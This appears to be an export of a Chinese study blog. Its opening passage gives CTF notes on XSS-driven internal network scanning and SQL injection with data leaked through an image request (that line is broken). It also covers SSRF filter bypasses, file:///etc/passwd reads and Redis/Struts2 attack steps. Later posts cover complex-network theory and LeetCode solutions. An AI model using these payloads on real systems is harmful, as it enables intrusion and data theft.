发起HTTP请求对内网主机进行扫描，对存在漏洞的主机进行攻击。这是XSS攻击中利用浏览器作为代理进行内网渗透的一种技术。通过XSS注入一些JavaScript代码到网页中，就可以利用浏览器发起HTTP请求对内网主机进行扫描，判断其是否存活和开放了哪些端口。然后根据扫描结果，对存在漏洞的主机进行进一步的攻击。例如，如果一个网站存在反射型XSS漏洞，攻击者可以构造一个包含如下代码的恶意链接：\n\n  ```html\n  <script>var ips = [\"192.168.0.1\", \"192.168.0.2\", \"192.168.0.3\"]; var ports = [80, 8080, 443]; var results = []; for (var i = 0; i < ips.length; i++) {for (var j = 0; j < ports.length; j++) {var img = new Image(); img.src = \"http://\" + ips[i] + \":\" + ports[j]; img.onerror = function() {results.push(this.src + \" is not reachable\");}; img.onload = function() {results.push(this.src + \" is reachable\");};}}</script>\n  ```\n\n  这段代码会创建一个内网IP地址和端口的数组，并循环遍历它们，创建一个隐藏的图片元素，将其src属性设置为内网主机的地址和端口。**如果图片加载失败，说明该主机或端口不可达；如果图片加载成功，说明该主机或端口可达**。这样就可以利用浏览器对内网主机进行扫描，并将扫描结果存储在一个数组中。然后，攻击者可以利用其他方法，如Ajax或WebSocket，将这个数组发送给自己的服务器，从而获取到内网主机的存活和开放情况。接下来，攻击者可以根据扫描结果，对存在漏洞的主机进行进一步的攻击。例如，如果发现某个主机开放了80端口，并且运行了一个存在SQL注入漏洞的网站，攻击者可以构造一个包含如下代码的恶意链接：\n\n  ```html\n  <script>var xhr = new XMLHttpRequest(); xhr.open(\"GET\", \"http://192.168.0.1:80/index.php?id=1' or 1=1 -- \", true); xhr.onload = function() {var img = new Image(); img.src = \"11 + encodeURIComponent(xhr.responseText);}; xhr.send();</script>\n  ```\n\n  这段代码会创建一个XMLHttpRequest对象，并向内网主机的80端口发送一个GET请求，其中包含了一个SQL注入语句。当请求完成后，就会将响应内容（即数据库中的所有数据）作为参数传递给一个恶意网站的地址，并创建一个隐藏的图片元素来发送请求。这样就可以利用浏览器对内网主机进行SQL注入攻击，并将数据库中的数据泄露给攻击者。\n\n## 第四章 服务端请求伪造(SSRF)\n\n### 如何形成\n\n由于服务端提供了从其他服务器或应用中获取数据的功能，但没有对目标地址作出有效的过滤和限制造成的。例如，服务端可能需要从用户指定的URL地址获取网页文本内容，加载指定地址的图片，或者调用第三方的API等。如果用户可以控制这些URL地址，那么他们就可能利用这个功能来访问一些正常情况下无法访问的资源，比如内网的服务，或者外网的敏感信息\n\n### 防护绕过\n\n#### 过滤体现\n\n+ 限制请求特定域名\n+ 禁止请求内网IP\n+ 禁止请求特定协议（如file、gopher、dict等）\n+ 对请求结果进行安全检查（如HTML转义、文件类型检测等）\n\n#### 绕过\n\n+ 使用`http://example.com@evil.com`这种格式来绕过正则\n+ IP地址转为进制（八进制、十进制、十六进制）及IP地址省略写法\n+ 配置域名\n\n### 危害与利用技巧\n\n#### 端口扫描\n\n可通过应用响应时间、返回的错误信息、返回的服务**Banner类**判断端口是否开放\n\n返回的服务Banner类判断端口是否开放：是一种利用服务端返回的一些信息来判断目标主机上某个端口是否运行了某种服务的方法。服务Banner是一种服务端在与客户端建立连接时发送的欢迎信息，通常包含了服务的类型、版本、开发商等信息。例如，如果您访问一个网站，那么网站服务器可能会返回一个类似于HTTP/1.1 200 OK的Banner，表示该服务器使用了HTTP协议，版本是1.1，状态码是200，表示请求成功。\n\n通过获取服务Banner，可以对目标主机上的服务进行识别和分析，从而发现一些潜在的漏洞和弱点。例如，如果一个服务器返回了SSH-2.0-OpenSSH_5.3的Banner，表示该服务器运行了SSH服务，版本是OpenSSH 5.3。那么我们就可以根据这个版本号来查找是否存在已知的漏洞，并尝试利用它们来攻击该服务器。\n\n有一些工具可以帮助我们进行服务Banner的获取和分析，例如nc、python、dmitry、nmap、amap等。这些工具可以通过发送特定的数据包到目标主机上的指定端口，并接收返回的数据包来获取服务Banner。然后根据服务Banner中的特征信息来判断端口是否开放，以及开放的端口上运行了什么样的服务。\n\n#### 攻击内网或者本地存在漏洞的服务（如缓冲区溢出）\n\nSSRF是一种利用服务器端的功能来发起请求的攻击，这些请求可能会访问到一些正常情况下无法访问的资源，比如内网的服务，或者外网的敏感信息。如果内网或本地的服务存在一些漏洞，那么攻击者可以通过SSRF来触发这些漏洞，从而实现任意代码执行或其他攻击目标。\n\n例如：如果内网的Redis服务没有设置密码，并且开启了**主从复制**功能，那么可以通过SSRF来写入恶意数据，并利用**Redis**主从复制机制来执行恶意命令。具体的过程如下：\n\n+ 攻击者首先找到一个可以利用SSRF的漏洞点，比如一个可以指定URL地址的参数。\n+ 攻击者构造一个特殊的URL地址，使用gopher协议，并在URL中包含Redis协议的命令。\n+ 这些命令可以设置Redis的主节点为攻击者控制的服务器，并将Redis的配置文件写入到可执行文件目录下。\n+ 攻击者将这个URL地址作为参数传递给服务器端，服务器端会根据这个URL地址发起请求。\n+ 由于gopher协议是一种TCP协议，服务器端会建立一个TCP连接，并将URL中的内容原封不动地发送给目标主机。\n+ 目标主机是内网的Redis服务，它会接收到服务器端发送过来的Redis协议命令，并执行它们。\n+  这样，内网的Redis服务就被设置为从节点，并与攻击者控制的主节点进行同步。同时，Redis的配置文件也被写入到可执行文件目录下。\n+ 攻击者可以在配置文件中插入恶意代码，并通过主节点向从节点发送命令，让从节点加载并执行配置文件中的代码。\n+ 这样，攻击者就实现了对内网Redis服务的任意代码执行。\n\n**主从复制**是一种数据备份和分布式处理的技术，它可以让一个数据库服务器（称为主服务器）的数据自动复制到另一个或多个数据库服务器（称为从服务器）上。这样，主服务器可以负责写入数据，而从服务器可以负责读取数据，从而提高数据的可用性和性能。主从复制也可以用于故障恢复和负载均衡。\n\n**Redis**是一种开源的、基于内存的、非关系型的数据库，它支持多种数据结构，如字符串、哈希、列表、集合、有序集合等。Redis也支持主从复制，可以让一个Redis服务器（称为主节点）的数据复制到其他的Redis服务器（称为从节点）上。Redis的主从复制是异步的，也就是说，主节点不会等待从节点的回应就可以继续处理其他请求。Redis的主从复制可以实现数据的冗余、故障恢复、负载均衡和高可用性。\n\n#### 对内网web应用进行指纹识别及攻击其中存在漏洞的应用\n\n例如，如果内网中有一个Struts2框架搭建的web应用，并且存在S2-045漏洞，那么可以通过SSRF来构造恶意请求头，并触发远程代码执行。具体的过程如下：\n\n+ 首先，我们需要找到一个可以利用SSRF的漏洞点，比如一个可以指定URL地址的参数。假设这个参数是url，并且我们知道内网中Struts2应用的地址是`http://192.168.1.100:8080/index.action`。\n+ 然后，我们可以构造一个特殊的URL地址，使用file协议，并在URL中包含Windows系统的配置文件win.ini。这样，我们就可以通过SSRF来读取服务器上的文件内容。例如，我们可以访问`http://payloads.net/ssrf.php?url=file:///c:/windows/win.ini`。\n+ 接着，我们可以修改HTTP请求头中的Content-Type值，利用S2-045漏洞中的OGNL表达式来执行系统命令。例如，我们可以执行whoami命令来获取当前用户的身份。我们可以使用Burp Suite等工具来修改请求头，并发送请求。\n+ 最后，我们可以在响应中看到执行结果，证明我们成功利用了SSRF和S2-045漏洞来攻击内网中的Struts2应用。\n\n#### 文件读取\n\n如果攻击者指定了file协议，可通过file协议来读取服务器上的文件内容：\n\n```url\nhttp://example.com/ssfr.php?url=file:///etc/passwd\n```\n\n#### 命令执行\n\nphp环境如果安装了except扩展，可通过except协议执行系统命令\n\n## 第五章 利用特性进行攻击\n\n","categories":["ctf"]},{"title":"菜鸟的ctf之旅(ctfhub技能树)","url":"/post/b4fd5249.html","content":"\n前面过于简单就没有记录，从web进阶开始吧！\n\n# LD_PRELOAD\n\n","categories":["ctf"]},{"title":"复杂网络学习","url":"/post/5443fa2d.html","content":"\n#### 前置基础知识\n\n##### 基本概念\n\nGraph：指无向图（undirected Graph），即忽略了两节点间边的方向。\n\nDiGraph：指有向图（directed Graph），即考虑了边的有向性。\n\nMultiGraph：指多重无向图，即两个结点之间的边数多于一条，又允许顶点通过同一条边和自己关联。\n\nMultiDiGraph：多重图的有向版本。\n\n<!--more-->\n\n**度：**节点度是指和该节点相关联的边的条数，又称关联度。特别地，对于有向图，节点的入度 是指进入该节点的边的条数；节点的出度是指从该节点出发的边的条数。\n\n**平均路径长度：**平均路径长度是[拓扑网络](https://link.zhihu.com/?target=https%3A//en.wikipedia.org/wiki/Network_topology%22%20%5Ct%20%22_blank)中的一个概念，定义为所有可能的网络[节点](https://link.zhihu.com/?target=https%3A//en.wikipedia.org/wiki/Node_(networking)%22%20%5Ct%20%22_blank)对的最短路径上的平均步数。它是网络上信息或大众运输效率的一种度量。\n\n**集聚系数：**在[图论](https://link.zhihu.com/?target=https%3A//en.wikipedia.org/wiki/Graph_theory%22%20%5Ct%20%22_blank)中，聚类系数是图中节点聚类的程度的度量。有证据表明，在大多数真实世界的网络中，特别是在[社交网络](https://link.zhihu.com/?target=https%3A//en.wikipedia.org/wiki/Social_network%22%20%5Ct%20%22_blank)中，节点往往以相对高密度的联系为特征，形成紧密的群体;这种可能性往往大于两个节点之间随机建立平局的平均概率\n\n**节点中心性：**在[图论](https://link.zhihu.com/?target=https%3A//en.wikipedia.org/wiki/Graph_theory%22%20%5Ct%20%22_blank)和[网络分析](https://link.zhihu.com/?target=https%3A//en.wikipedia.org/wiki/Network_theory%22%20%5Ct%20%22_blank)中，中心性指标确定图中最重要的[顶点](https://link.zhihu.com/?target=https%3A//en.wikipedia.org/wiki/Vertex_(graph_theory)%22%20%5Ct%20%22_blank)。应用程序包括识别[社交网络](https://link.zhihu.com/?target=https%3A//en.wikipedia.org/wiki/Social_network%22%20%5Ct%20%22_blank)中最有影响力的人、[互联网](https://link.zhihu.com/?target=https%3A//en.wikipedia.org/wiki/Internet%22%20%5Ct%20%22_blank)或[城市网络](https://link.zhihu.com/?target=https%3A//en.wikipedia.org/wiki/Transport_network%22%20%5Ct%20%22_blank)中的关键基础设施节点和疾病的[超级传播者](https://link.zhihu.com/?target=https%3A//en.wikipedia.org/wiki/Super-spreader%22%20%5Ct%20%22_blank)。中心性概念最早出现在[社会网络分析](https://link.zhihu.com/?target=https%3A//en.wikipedia.org/wiki/Social_network_analysis%22%20%5Ct%20%22_blank)中，许多衡量中心性的术语反映了它们的[社会学](https://link.zhihu.com/?target=https%3A//en.wikipedia.org/wiki/Sociology%22%20%5Ct%20%22_blank)渊源。它们不应该与[节点影响度量](https://link.zhihu.com/?target=https%3A//en.wikipedia.org/wiki/Node_influence_metric%22%20%5Ct%20%22_blank)相混淆，节点影响度量试图量化网络中每个节点的影响。\n\n##### 复杂网络特性\n\n+ 小世界特性(Small world),即网络中点与点之间的特征路径长度值小,接近随机网络,但网络的聚合系数却很高,接近规则网络。\n+ 无标度特性(Scale-free),即在网络中少数节点的度值会很大,而大部分节点却很小,节点的度值分布符合幂率分布规律\n+ 社团结构特性,复杂网络中的节点往往会呈现出集群特性,即社团区域内部节点之间的联系非常强,而社团内节点与社团外节点的联系明显减弱。\n\n##### 复杂网络统计特性\n\n+ 平均路径长度\n  复杂网络里，两节点之间的最短路径上所包含的边的数目就表示两个节点之间的距离。网络中任意两个节点之间距离的平均值就是网络的平均路径长度，它代表了网络中节点间的分离程度，是网络全局特性的反映。\n\n+ 度、度分布、度相关性\n\n  度：复杂网络里，一个节点与网络中其他节点的连边总数就是节点的度。\n  度分布：网络中节点的度值按从小到大排序，统计得到度为 k 的节点占整个网络节点数的比例 P(k)，就是网络的度分布（Degree distribution）；从概率角度看，P(k)就是网络中随机选择一个节点，其度为 k 的概率\n  度相关性\n  同配：度大节点倾向于连接度大节点。同配网络相关性系数 > 0\n  异配：度大节点倾向于连接度小节点。异配网络相关性系数 < 0\n  中性：节点间的连接与它们自身的度值无关。中性网络相关性系数 = 0\n\n+ 聚集系数\n  复杂网络里，一个节点的邻居节点之间连边的数目占这些邻居节点之间最大可能连边数目的比例就是节点的聚集系数。网络中所有节点聚集系数的平均值就是网络的聚集系数，它反映了网络中节点的聚集情况即网络的聚集性。\n\n+ 介数\n  分为节点介数和边介数。\n\n  节点介数：指网络中所有最短路径中经过该节点的数量占总的最短路径数量的比例\n\n  边介数则指网络中所有最短路径中经过该边的数量占总的最短路径数量的比例。\n\n##### 确定节点重要性\n\n+ 基于网络局域特征的排序方法\n  + **度中心性**：根据节点度数排\n+ 基于网络全局属性的排序方法\n  + **介数中心性/中介中心性** Betweenness Centrality：网络中所有的两节点间的最短路径中经过某个节点的条数越多，那么该节点就越重要。\n  + **紧密度中心性**：计算节点到网络中的其他节点的最短距离，到其他节点的最短距离之和越小，紧密度越大，则节点就越接近网络的几何中心，节点也就越重要\n  + **离心中心性**（Eccentricity）：一个节点与网络中的所有节点的最短距离之中的最大值。点的离心中心性越小，说明越接近网络的中心，节点就越重要\n  + **特征向量中心性**（Eigenvector Centrality）：如果节点A连接并影响着节点B，而节点B被其他更多节点连接着，则节点A的特征向量中心性就很大\n\n#### 理解数据集内容\n\n##### 图像一\n\n![image-20230720211847401](./%E5%A4%8D%E6%9D%82%E7%BD%91%E7%BB%9C%E5%AD%A6%E4%B9%A0/image-20230720211847401.png)\n\n这张图就是将网络图像化，这里的network就是一个场景，比如在internet中，节点就是路由器，边就是网络的连接，应该就指路由器之间的拓扑连接，后面指明是有向边还是无向边，然后数据集中的节点数量，链路数量，k是一个结点的平均度数\n\n###### 代码部分\n\n计算不同网络节点数，边数，平均度数\n\n##### 图像二\n\n![image-20230720215629960](./%E5%A4%8D%E6%9D%82%E7%BD%91%E7%BB%9C%E5%AD%A6%E4%B9%A0/image-20230720215629960.png)\n\n现在分析这张图，N是节点数，k是平均度数，注意无边图一条边两个节点共享，第三个字母应该是聚类系数，即一个度量图中节点之间聚集程度或紧密程度的指标，取值范围在-1到1之间。它等于所有节点局部聚类系数（即一个节点与其邻居形成三角形比例）减去随机图中期望的局部聚类系数，d0表示度数为0的节点所占的比例，d1表示度数为1的节点所占的比例\n\n###### 代码部分\n\n这部分和第一张图的代码部分很相似，就是计算不同网络数据集的节点数，边数，平均度\n\n##### 图像三\n\n![img](./%E5%A4%8D%E6%9D%82%E7%BD%91%E7%BB%9C%E5%AD%A6%E4%B9%A0/PRE2020b.png)\n\n这张图表示两个经验网络的结构特征，包括节点数N、边缘E数、平均度(K)、分类系数r和聚类系数C。分类系数是指一个节点与其邻居节点之间的平均相似度，也就是节点的一跳邻域内所有边的权重之和除以边的个数，这种定义下的分类系数可以是正数或者负数，取决于边的权重是正还是负。如果边的权重表示相似度，那么正数表示相似，负数表示不相似；如果边的权重表示差异度，那么正数表示不相似，负数表示相似。\n\n\n\n##### 图像四\n\n![img](./%E5%A4%8D%E6%9D%82%E7%BD%91%E7%BB%9C%E5%AD%A6%E4%B9%A0/PRE2021.png)\n\n包含了网络名称、最大连通分量的节点数、最大连通分量的边数、指数v的值、参数σ的值、平均聚类系数c、网络的相位。指数v的值和参数σ的值是用来描述网络的标度律特性的指标，标度律是指网络中节点的度分布服从幂律分布，也就是说，网络中度为k的节点的数量与k的负幂成正比，指数v的值是指网络中节点度的平均值，也就是说，网络中所有节点的度之和除以节点的个数，**指数v的值**是指网络中节点度的平均值，也就是说，网络中所有节点的度之和除以节点的个数，**参数σ的值**是指网络中节点度的标准差，也就是说，网络中所有节点的度与平均度之差的平方和除以节点个数再开根号，**网络的相位**是指网络在不同状态下表现出不同的行为特征。一般来说，网络可以分为三种相位：有序相、临界相和混沌相。在**有序相**中，网络中大部分节点都处于稳定或者同步的状态，即使有少量节点发生变化也不会影响整个网络。在**临界相**中，网络中存在一个临界点或者临界区域，在这里网络表现出最大的复杂性和多样性。在**混沌相**中，网络中大部分节点都处于不稳定或者异步的状态，即使有少量节点保持不变也不会影响整个网络\n\n##### 图像五\n\n![img](./%E5%A4%8D%E6%9D%82%E7%BD%91%E7%BB%9C%E5%AD%A6%E4%B9%A0/TNSE2023.png)\n\n实无标度网络的基本拓扑性质和一些标度指数的值。从左到右依次为网络名称、类别、节点数N、边数E、平均度(K)、度分布指数λ、最优度指数β、归一化平均度指数γ，和标度指数a*。\n\n解释：度分布指数λ是指网络中**实际的**节点度的幂律分布的指数，也就是说，网络中度为k的节点的数量与k的负λ次方成正比\n\n归一化平均度指数γ是指网络中节点度与平均度之比的归一化处理后得到的指数，也就是说，网络中节点度为k的节点的数量与k除以平均度v再取对数后成正比\n\n最优度指数β是指网络中节点度的**最优分布**的指数，也就是说，网络中度为k的节点的数量与k的负β次方成正比\n\na的值是1表示你的图中节点度与最小度之比再取对数后得到的指数是1，也就是说，你的图中节点度与最小度之比的对数分布是线性的\n\n###### 代码部分\n\nm=2\n\n![image-20230722202617211](./%E5%A4%8D%E6%9D%82%E7%BD%91%E7%BB%9C%E5%AD%A6%E4%B9%A0/image-20230722202617211.png)\n\nm=5\n\n![image-20230722202636334](./%E5%A4%8D%E6%9D%82%E7%BD%91%E7%BB%9C%E5%AD%A6%E4%B9%A0/image-20230722202636334.png)\n\nλ=2.1\n\n![image-20230722202505521](./%E5%A4%8D%E6%9D%82%E7%BD%91%E7%BB%9C%E5%AD%A6%E4%B9%A0/image-20230722202505521.png)\n\nλ=2.5\n\n![image-20230722202518334](./%E5%A4%8D%E6%9D%82%E7%BD%91%E7%BB%9C%E5%AD%A6%E4%B9%A0/image-20230722202518334.png)\n\n##### 图像六\n\n![img](./%E5%A4%8D%E6%9D%82%E7%BD%91%E7%BB%9C%E5%AD%A6%E4%B9%A0/JETCAS2023.png)\n\n16个实数据集的基本拓扑性质前六列显示网络名称、类别、数节点、边数、平均度和epidemic threshold:βc。\n\nβc是指一个网络中发生传染病流行的临界条件，也就是说，当传染病的传播率β超过这个临界值βc时，传染病就有可能在网络中广泛传播；当传播率β低于这个临界值βc时，传染病就有可能在网络中消失。这个临界值βc与网络的结构和拓扑性质有关，一般来说，网络中节点度的分布越不均匀，临界值βc就越低，也就是说，网络越容易发生传染病流行。图中βc的值是0点几，那么可能说明图中节点度的分布比较不均匀，也就是说，图是一个无尺度网络或者近似无尺度网络。\n\n无尺度网络是一种复杂网络，其特点是网络中的大部分节点只和很少节点连接，而有极少的节点与非常多的节点连接。这种网络的节点度分布遵循幂律分布，也就是说，高度数的节点的概率随着度数的增加而缓慢下降，没有一个典型的平均值。无尺度网络在现实中很常见，例如万维网、社交网络、金融网络等。\n\n###### 代码部分\n\n最后的代码其实就是用于评估不同的节点中心性算法和真实的中心性排名之间的相关性。\n\n在EHCC 算法（一种网络中心性算法）中，考虑的是扩展度数而不是直接用的度数，原因：使用扩展度量的目的是为了更全面地衡量节点在网络中的重要性。虽然节点的度（degree）是一个最常见的中心性度量，但它只考虑了节点直接相邻的连接数，没有考虑到节点的邻居节点的连接情况。\n\n#### 文件类型解析\n\ntxt文件:\n\n+ 第一种：一行代表一条边，比如 0 1代表的是0到1有一条边，根据提示判断是否是有向边\n+ 第二种：一行有四个数字，前两个数字是节点的编号，第三个数字是边的权重，第四个数字是边的时间戳，表示边的创建时间。有些图的边是随着时间变化的，所以需要记录时间戳，在读取文件的时候可以用data=False，就会忽略权重和时间戳。<u>**如果你想读取权重**</u>(未解决)\n\ngml文件:我看到的gml文件格式是:\n\n```gml\ngraph\n[\n\tdirected 0 #代表无向图\n\tnode #代表一个结点的属性\n\t[\n\t\tid 0 #编号，唯一\n\t\tlabel \"8001\"# 标签，不唯一，可以提供更多的信息和含义\n\t]\n\tnode\n\t[\n\t\t...\n\t]\n\t...\n\tedge#边\n\t[\n\t\tsource 0#起点\n\t\ttarget 2#终点\n\t]\n\tedge\n\t[\n\t\t...\n\t]\n\t...\n]\n```\n\n","tags":["python"],"categories":["复杂网络"]},{"title":"leetcode100题_1","url":"/post/9405f8.html","content":"\n这里是leetcode必做100题，包含了我自己想到的思路以及看了题解之后理解的思路，（ps:前面几个太懒了没写知识点，后面都有写哦！QwQ）\n\n2023.8.3:突然发现随机一题里面不是必做100题题库里的（TwT），没事，多多益善吧OvO\n\n2023.8.7:本来想写到一起的，但是感觉太多了，另起新篇章吧\n\n<!--more-->\n\n## 两数之和（简单题）\n\n### 题目描述\n\n给定一个整数数组 `nums` 和一个整数目标值 `target`，在该数组中找出 **和为目标值** *`target`* 的那 **两个** 整数，并返回它们的数组下标。\n\n输入：nums = [2,7,11,15], target = 9\n\n输出：[0,1]  因为 nums[0] + nums[1] == 9 ，返回 [0, 1] 。\n\n### 题解\n\n##### 暴力求解\n\n（ps:看到这种题自己的第一反应还是暴力求解/(ㄒoㄒ)/~~，复杂度直接上升到o(n^2)，下面就不介绍暴力求解思路了，直接附上代码，大概需要注意的就是**returnSize需要修改**）\n\n```c\nint* twoSum(int* nums, int numsSize, int target, int* returnSize){\n    int *result=(int*)malloc(sizeof(int)*2);\n    *returnSize=2;\n    for(int i=0;i<numsSize-1;i++){\n        for(int j=i+1;j<numsSize;j++){\n            if(nums[i]+nums[j]==target){\n                result[0]=i;\n                result[1]=j;\n                return result;\n            }\n        }\n    }\n    return result;\n}\n```\n\n##### 构造哈希\n\n###### 思路\n\n暴力求解是先遍历i，再遍历j，使得两个数之后为target，但这种方法就需要对每一个i遍历一遍数组，那就想办法遍历i之后直接找到j的值，也就是通过nums[j]=target-nums[i]从而得到nums[j]的值，根据nums[j]的值，直接确定j下标，哈希表可以做到这件事，总体思路就是把nums[i]当成键存在哈希表中，值为原键值，target-nums[i]的值不在索引中里，就进行添加，这样只需要遍历一次\n\n###### 代码\n\n```c++\nclass Solution {\npublic:\n    vector<int> twoSum(vector<int>& nums, int target) {\n        unordered_map<int,int> hashtable;\n        for(int i=0;i<nums.size();i++){\n            auto x=hashtable.find(target-nums[i]);\n            if(x!=hashtable.end()){\n                return {x->second,i};\n            }else{\n                hashtable[nums[i]]=i;\n            }\n        }\n        return {};\n    }\n};\n```\n\n###### 关键部分解释\n\n+ `auto` 用于自动推断 `x` 变量的类型，因为其类型比较复杂且比较长，使用 `auto` 可以简化代码，使代码更加简洁易读。\n\n+ `x->second` 是哈希表迭代器 `x` 指向的元素的值部分,键部分是通过 `x->first` 来获取的，在这里两个相同\n\n## 字母异位词分组（中等题）\n\n### 题目描述\n\n给你一个字符串数组，请你将 **字母异位词** 组合在一起。可以按任意顺序返回结果列表。\n\n**字母异位词** 是由重新排列源单词的所有字母得到的一个新单词。\n\n输入: strs = [\"eat\", \"tea\", \"tan\", \"ate\", \"nat\", \"bat\"]\n输出: [[\"bat\"],[\"nat\",\"tan\"],[\"ate\",\"eat\",\"tea\"]]\n\n#### 思路\n\n又是一个哈希题，该题我们主要要解决的找到字母异味词，并排列在一起，我们可以找到一种字母异味词的共同点，还是用哈希的方法，哈希的键为这个共同点，哈希的值为具体的字符串，这个共同点官方给出了两种，下面只提供一种方法，还看到一种题解将每个字母设为一个质数，一个字符串就用所有字母对应质数的乘积表示，也可以确定不同的字母异味词有不同的结果\n\n###### 以字母排序后的结果为共同点\n\n代码如下：\n\n```c++\nclass Solution {\npublic:\n    vector<vector<string>> groupAnagrams(vector<string>& strs) {\n        unordered_map<string,vector<string>> hashmap;//键是字符串，值是字符串列表\n        vector<vector<string>> ans;\n        for(string str : strs){\n            string str2=str;\n            sort(str.begin(),str.end());\n            hashmap[str].emplace_back(str2);//这儿在尾部进行插入，不是直接赋值，因为不止存一个值\n        }\n        for(auto map=hashmap.begin();map!=hashmap.end();map++){\n            ans.emplace_back(map->second);\n        }\n        return ans;\n    }\n};\n```\n\n## 有效的括号（简单题）\n\n### 题目描述\n\n给定一个只包括 '('，')'，'{'，'}'，'['，']' 的字符串 s ，判断字符串是否有效。\n\n有效字符串需满足：\n\n左括号必须用相同类型的右括号闭合。\n左括号必须以正确的顺序闭合。\n每个右括号都有一个对应的相同类型的左括号。\n\n### 题解\n\n#### 思路\n\n思路并不复杂，很简单的堆栈结构，先进先出，遍历一遍字符串，如果是),},]就插入堆，如果是{,(,[就和堆最后一个字符比较，如果匹配成功堆就取出这个数据\n\n代码：\n\n```c++\nclass Solution {\npublic:\n    bool isValid(string s) {\n        char str[10000];\n        str[0]=s.at(0);\n        s.erase(s.begin());\n        int i=0;\n        for(auto ss : s){\n            if(ss=='('||ss=='['||ss=='{'){\n                str[++i]=ss;\n            }else{\n                if(((ss==']'&&str[i]=='[')||(ss==')'&&str[i]=='(')||(ss=='}'&&str[i]=='{'))&&i!=-1){//i不能是-1，该情况为()}\n                    i--;\n                }else{\n                    return false;\n                }\n            }\n        }\n        if(i!=-1){//最后i必须是-1，避免[情况\n            return false;\n        }\n        return true;\n    }\n};\n```\n\n## 判断单词是否能放进填字游戏内（中等）\n\n### 题目描述\n\n给你一个 m x n 的矩阵 board ，它代表一个填字游戏 当前 的状态。填字游戏格子中包含小写英文字母（已填入的单词），表示 空 格的 ' ' 和表示 障碍 格子的 '#' 。\n\n如果满足以下条件，那么我们可以 水平 （从左到右 或者 从右到左）或 竖直 （从上到下 或者 从下到上）填入一个单词：\n\n该单词不占据任何 '#' 对应的格子。\n每个字母对应的格子要么是 ' ' （空格）要么与 board 中已有字母 匹配 。\n如果单词是 水平 放置的，那么该单词左边和右边 相邻 格子不能为 ' ' 或小写英文字母。\n如果单词是 竖直 放置的，那么该单词上边和下边 相邻 格子不能为 ' ' 或小写英文字母。\n给你一个字符串 word ，如果 word 可以被放入 board 中，请你返回 true ，否则请返回 false 。\n\neg:![img](./2023-7-20%E4%BB%8A%E6%97%A5%E7%BB%83%E4%B9%A0/crossword-1.png)\n\n输入：board = [[\"#\", \" \", \"#\"], [\" \", \" \", \"#\"], [\"#\", \"c\", \" \"]], word = \"abc\"\n输出：true\n解释：单词 \"abc\" 可以如上图放置（从上往下）。\n\n### 题解\n\n#### 思路\n\n1. 由于可以正向匹配和反向匹配，所以我直接用两次匹配，一次正向，一次反向\n\n2. 由于可以行匹配和列匹配，所以用了两个for循环，两个循环结束之后对word进行逆转，反向匹配\n\n3. 每次匹配到空格或者第一个字符的时候就删掉word第一个字符，中间过程但凡有一个不合规范，比如遇到了不属于该字符串的字符立马恢复word（用word2存储原始的word，逆转的时候注意逆转word2）\n\n4. 以word的长度为0作为判断条件，但是需要确保向下邻近或者向有邻近的字符是#或者没有\n\n   ```c++\n   class Solution {\n   public:\n       bool placeWordInCrossword(vector<vector<char>>& board, string word) {\n           int x=board.size();//行数\n           int y=board[0].size();//列数\n           string word2=word;//为了恢复\n           char firstChar = word[0];\n           for(int i=0;i<2;i++){\n               for(int xx=0;xx<x;xx++){//对每一行\n               for(int yy=0;yy<y;yy++){//对每一行的每个位置\n                   if((y-yy)>=word.length()&&board[xx][yy]!='#'){\n                       if(board[xx][yy]!=firstChar&&board[xx][yy]!=' '){\n                           word=word2;\n                           firstChar = word[0];\n                           while((y-yy)>=word.length()&&yy<y-1&&board[xx][yy+1]!='#'){\n                               yy++;\n                           }\n                       }else{\n                               word.erase(0, 1);//erase 函数的第一个参数表示要删除的起始位置，第二个参数表示要删除的字符数量。\n                               if(word.length()==0){\n                                   if(yy<y-1&&board[xx][yy+1]!='#'){\n                                       word=word2;\n                                       while((y-yy)>=word.length()&&yy<y-1&&board[xx][yy+1]!='#'){\n                                           yy++;\n                                       }\n                                   }else{\n                                       return true;\n                                   } \n                               }\n                               firstChar = word[0];\n                       }\n                   }else{\n                       word=word2;\n                       firstChar = word[0];\n                   }\n               }\n           }\n           word=word2;\n           firstChar = word[0];\n           for(int yy=0;yy<y;yy++){//对每一列\n               for(int xx=0;xx<x;xx++){//对每一行的每个位置\n                   if((x-xx)>=word.length()&&board[xx][yy]!='#'){\n                       if(board[xx][yy]!=firstChar&&board[xx][yy]!=' '){\n                           word=word2;\n                           firstChar = word[0];\n                           while(xx<x-1&&board[xx+1][yy]!='#'){\n                           xx++;\n                           }\n                       }else{\n                               word.erase(0, 1);//erase 函数的第一个参数表示要删除的起始位置，第二个参数表示要删除的字符数量。\n                               if(word.length()==0){\n                                   if(xx<x-1&&board[xx+1][yy]!='#'){\n                                       word=word2;\n                                       while(xx<x-1&&board[xx+1][yy]!='#'){\n                                           xx++;\n                                       }\n                                   }else{\n                                       return true;\n                                   } \n                               }\n                               firstChar = word[0];\n                       }\n                   }else{\n                       word=word2;\n                       firstChar = word[0];\n                   }\n               }\n           }\n           reverse(word2.begin(),word2.end());\n           word=word2;\n           firstChar = word[0];\n           }\n           \n           return false;\n       }\n   };\n   ```\n\n   \n\n## 跳跃游戏（中等）\n\n### 题目描述\n\n给定一个长度为 `n` 的 **0 索引**整数数组 `nums`。初始位置为 `nums[0]`。每个元素 `nums[i]` 表示从索引 `i` 向前跳转的最大长度。换句话说，如果你在 `nums[i]` 处，你可以跳转到任意 `nums[i + j]` 处:`0 <= j <= nums[i]` \n\n- `i + j < n`\n\n返回到达 `nums[n - 1]` 的最小跳跃次数。生成的测试用例可以到达 `nums[n - 1]`\n\n### 题解\n\n##### 预备知识\n\n- `vector<int> a(2);` 是一个单独的vector对象，初始化大小为2。\n- `vector<int> a[2];` 是一个长度为2的数组，数组中的每个元素都是一个独立的vector对象。（相当于定义两个数组）\n\n##### 思路\n\n###### 思路一：\n\n先来讲一下lz自己的思路吧/(ㄒoㄒ)/~~（比较麻烦，但是确实做了好久）\n\n同时进行一跳，比如在索引0位置时，索引0位置的值是3，那就同时进行0、1、2、3跳，然后存下这三跳的位置，再从这三跳再同时往下跳，期间为了减少缓存和运行时间，将每一跳到的位置存下来，如果之后有某一条跳到了该位置自动忽略，也就是每个点只跳一次\n\n代码：\n\n```c++\nclass Solution {\npublic:\n    int jump(vector<int>& nums) {\n        vector<int> node(10000, 0);\n        vector<int> node2(10000, 0);\n        vector<int> node3(10000, 0);\n        int length=1;\n        int lengthnext=0;\n        int cnt=0;\n        int n=nums.size();\n        int i=0;\n        if(n==1){\n            return 0;\n        }\n        while(1){\n            cnt++;\n            for(i=0;i<length;i++){\n                for(int j=0;j<=nums[node2[i]];j++){\n                    if(node3[node2[i]+j]==1){\n                        